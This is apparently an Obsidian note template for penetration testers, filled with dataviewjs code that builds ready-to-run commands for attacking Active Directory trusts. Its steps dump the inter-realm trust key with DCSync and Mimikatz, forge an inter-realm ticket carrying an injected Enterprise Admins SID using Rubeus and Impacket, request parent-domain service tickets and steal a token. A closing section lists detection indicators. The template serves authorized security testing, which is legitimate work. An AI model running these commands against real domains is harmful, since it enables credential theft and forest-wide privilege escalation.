---
# Attack-specific fields
trusted_domain:
trusted_domain_sid:
trusted_domain_dc_ip:
trust_direction:
trust_type:
inter_realm_key:
parent_child_sid:
target_user:
forged_ticket:
notes:
---

# Forest & Domain Trust Attacks

> [!abstract] Attack Summary
> Active Directory trusts allow users in one domain/forest to access resources in another. Attacks depend on trust type and direction: **Parent-Child** (same forest, implicit trust — can be escalated via SID History or ExtraSid injection), **Forest Trusts** (cross-forest, more restricted), and **External Trusts** (to specific domains outside the forest).

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",     b?.domain     ?? "—"],
  ["DC IP",      b?.dc_ip      ?? "—"],
  ["DC FQDN",    b?.dc_fqdn    ?? "—"],
  ["Domain SID", b?.domain_sid ?? "—"],
  ["Username",   b?.username   ?? "—"],
  ["OS Env",     b?.os_env     ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();

const trustDirections = ["inbound","outbound","bidirectional"];
const trustDirOptions = trustDirections.map(t => `option(${t})`).join(',');

const trustTypes = ["parent_child","tree_root","external","forest"];
const trustTypeOptions = trustTypes.map(t => `option(${t})`).join(',');

dv.table(["Field", "Value"], [
  ["Trusted Domain",      `\`INPUT[text:trusted_domain]\``],
  ["Trusted Domain DC IP",`\`INPUT[text:trusted_domain_dc_ip]\``],
  ["Trusted Domain SID",  `\`INPUT[text:trusted_domain_sid]\``],
  ["Trust Direction",     `\`INPUT[inlineSelect(defaultValue(${p.trust_direction ?? 'inbound'}),${trustDirOptions}):trust_direction]\``],
  ["Trust Type",          `\`INPUT[inlineSelect(defaultValue(${p.trust_type ?? 'parent_child'}),${trustTypeOptions}):trust_type]\``],
  ["Target User",         `\`INPUT[text:target_user]\``],
]);
```

---

## Step 1 — Enumerate Trusts

**Windows — PowerView**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain = b?.domain ?? "DOMAIN";
dv.paragraph("```powershell\n# Enumerate all trusts from current domain\nGet-DomainTrust\n\n# Get forest trusts\nGet-ForestTrust\n\n# Get trust details\nGet-DomainTrust | Select-Object SourceName,TargetName,TrustDirection,TrustType,TrustAttributes\n\n# Direction values:\n# 1 = Inbound (trusted domain can access our domain)\n# 2 = Outbound (we can access the trusted domain)\n# 3 = Bidirectional\n```");
```

**Windows — ADSearch**
```dataviewjs
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe " +
  "--search \"(objectClass=trustedDomain)\" --attributes trustDirection,trustPartner,trustAttributes,flatname\n```");
```

**Linux — LDAP**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain ?? "DOMAIN";
const dc_ip    = b?.dc_ip  ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\nldapsearch -x -H ldap://" + dc_ip + " -D '" + username + "@" + domain + "' -w '" + password + "' " +
  "-b 'CN=System," + domain.split('.').map(x => "DC=" + x).join(',') + "' '(objectClass=trustedDomain)' " +
  "trustDirection trustPartner trustAttributes\n```");
```

Trusted domain: `INPUT[text:trusted_domain]` | DC IP: `INPUT[text:trusted_domain_dc_ip]`
Trust direction: `INPUT[text:trust_direction]` (0=None, 1=Inbound, 2=Outbound, 3=Bidirectional)

---

## Step 2 — Enumerate Cross-Trust Resources

**Windows — PowerView (enumerate trusted domain)**
```dataviewjs
const p = dv.current();
const trustedDomain = p?.trusted_domain || "TRUSTED.DOMAIN";
dv.paragraph("```powershell\n# Enumerate users in trusted domain\nGet-DomainUser -Domain " + trustedDomain + "\n\n# Enumerate groups\nGet-DomainGroup -Domain " + trustedDomain + " -Properties samaccountname,groupscope\n\n# Find foreign users (trust members in local domain groups)\nGet-DomainForeignUser\n\n# Find local groups containing foreign members\nGet-DomainForeignGroupMember -Domain " + trustedDomain + "\n```");
```

---

## Attack A — Parent-Child Trust Escalation (SID History / Extra SID)

> [!abstract] In a Parent-Child trust (same forest), you can forge an inter-realm ticket with the Parent domain's Enterprise Admins SID injected. This grants DA-level access in the parent domain.

**Step A1 — Get inter-realm trust key**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain    = b?.domain ?? "DOMAIN";
const shortDom  = domain.split('.')[0].toUpperCase();
const trustedDomain = p?.trusted_domain || "PARENT.DOMAIN";
const parentShort = trustedDomain.split('.')[0].toUpperCase();
dv.paragraph("```bash\n# Extract the inter-realm trust key (from child DC, requires DA in child)\n# The key is stored as the trust account: PARENT\\CHILD$\ndcsync " + domain + " " + shortDom + "\\" + parentShort + "$\n\n# Or via Mimikatz\nlsadump::trust /patch\n\n# Or DCSync the trust account\nlsadump::dcsync /domain:" + domain + " /user:" + parentShort + "$\n```");
```

Inter-realm key: `INPUT[text:inter_realm_key]`

**Step A2 — Get Enterprise Admins SID**
```dataviewjs
const p = dv.current();
const trustedDomain = p?.trusted_domain || "PARENT.DOMAIN";
const trustedDomainSid = p?.trusted_domain_sid || "S-1-5-21-PARENT-SID";
dv.paragraph("```bash\n# Enterprise Admins SID = Parent Domain SID + RID 519\n# If parent SID is S-1-5-21-XXXX-YYYY-ZZZZ, then EA SID = S-1-5-21-XXXX-YYYY-ZZZZ-519\n\n# Get parent domain SID\nGet-DomainSID -Domain " + trustedDomain + "\n\n# Or extract from trust\n# Enterprise Admin SID: " + trustedDomainSid + "-519\n```");
```

Parent SID: `INPUT[text:trusted_domain_sid]`

**Step A3 — Forge Inter-Realm Ticket (with Extra SID)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain    = b?.domain ?? "domain.local";
const domainSid = b?.domain_sid ?? "S-1-5-21-CHILD-SID";
const parentDomain = p?.trusted_domain || "parent.domain";
const parentSid    = p?.trusted_domain_sid || "S-1-5-21-PARENT-SID";
const eaSid        = parentSid + "-519";
const interRealmKey= p?.inter_realm_key || "INTER_REALM_KEY";
const targetUser   = p?.target_user || "administrator";
dv.paragraph("```bash\n# Windows — Rubeus (forge inter-realm TGT with EA SID)\nC:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe silver " +
  "/service:krbtgt/" + parentDomain + " " +
  "/rc4:" + interRealmKey + " " +
  "/user:" + targetUser + " " +
  "/domain:" + domain + " " +
  "/sid:" + domainSid + " " +
  "/sids:" + eaSid + " " +
  "/nowrap\n\n# Linux — Impacket ticketer\nimpacket-ticketer -nthash " + interRealmKey + " -domain-sid " + domainSid +
  " -domain " + domain + " -spn krbtgt/" + parentDomain +
  " -extra-sid " + eaSid + " " + targetUser + "\n```");
```

Forged ticket: `INPUT[text:forged_ticket]`

**Step A4 — Request TGS in Parent Domain**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const parentDomain = p?.trusted_domain || "parent.domain";
const parentDcIp   = p?.trusted_domain_dc_ip || "PARENT_DC_IP";
const ticket       = p?.forged_ticket || "BASE64_TICKET";
const targetUser   = p?.target_user || "administrator";
dv.paragraph("```bash\n# Exchange inter-realm TGT for TGS in parent domain\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asktgs " +
  "/service:cifs/" + (b?.dc_fqdn?.replace(b?.domain ?? '', parentDomain) || "DC.parent.domain") + " " +
  "/dc:" + parentDcIp + " " +
  "/ticket:" + ticket + " " +
  "/nowrap\n\n# Or use directly\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe createnetonly " +
  "/program:cmd.exe /domain:" + parentDomain.split('.')[0].toUpperCase() +
  " /username:" + targetUser + " /password:FakePass /ticket:" + ticket + "\nsteal_token PID\n```");
```

---

## Attack B — One-Way Inbound Trust Abuse

> [!info] If the trusted domain has users that are members of groups in our domain, enumerate what they can access.

**Windows — Enumerate foreign principals**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain = b?.domain ?? "DOMAIN";
const trustedDomain = p?.trusted_domain || "TRUSTED.DOMAIN";
const domParts = domain.split('.').map(x => "DC=" + x).join(',');
dv.paragraph("```powershell\n# Find foreign security principals\nGet-ADObject -Filter {objectClass -eq 'foreignSecurityPrincipal'} -SearchBase 'CN=ForeignSecurityPrincipals," + domParts + "' -Properties *\n\n# PowerView\nGet-DomainForeignUser -Domain " + domain + "\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - Inter-realm TGT requests appear in Event 4768/4769 on the parent DC.
> - SID injection (ExtraSid) — PAC validation on 2016+ DCs may flag anomalous SIDs.
> - SID filtering is enabled for external/forest trusts — ExtraSid attacks don't work across forest trust boundaries.
> - Monitor for unusual authentication from child domains to parent DC.

---

## Notes & Results

`INPUT[textarea:notes]`
